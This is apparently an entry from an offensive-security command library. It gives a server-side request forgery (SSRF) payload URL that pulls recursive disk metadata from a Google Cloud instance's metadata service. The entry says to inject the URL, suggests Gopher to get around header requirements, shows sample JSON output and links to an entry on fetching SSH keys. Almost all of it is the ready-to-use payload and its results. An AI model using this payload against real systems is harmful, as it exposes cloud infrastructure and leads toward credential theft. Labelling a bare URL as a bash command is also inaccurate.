---
type: command
executor: bash
data: >-
  http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - GCP
tags:
  - ssrf
  - metadata
  - disks
verified: true
validated: true
---

# request-google-instance-disks-metadata-recursive

## Command

```bash
http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true
```

## Description

This command provides the URL payload to retrieve recursive metadata about attached disks on a GCP instance via SSRF, including device details and types.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| http://metadata.google.internal/computeMetadata/v1/instance/disks/ | Base path for instance disks metadata | Yes |
| ?recursive=true | Fetches nested disk information | Yes |

## Examples

### Basic Usage

Inject as SSRF payload:

```bash
http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true
```

### Advanced Usage

Combine with Gopher for header support if needed (see related gopher command).

## Expected Output

JSON response with disk details:

```
{
  "deviceName": "/dev/sda",
  "interface": "SCSI",
  "kind": "compute#disk",
  "licenses": [],
  "mode": "READ_WRITE",
  "schedule": "AUTO",
  "source": "https://www.googleapis.com/compute/v1/projects/project/zones/zone/disks/disk",
  "type": "pd-standard"
}
```

## Related

- [[procedures/google-cloud-ssrf-metadata-retrieval]]
- [[commands/gopher-ssrf-fetch-ssh-keys-google-metadata]]
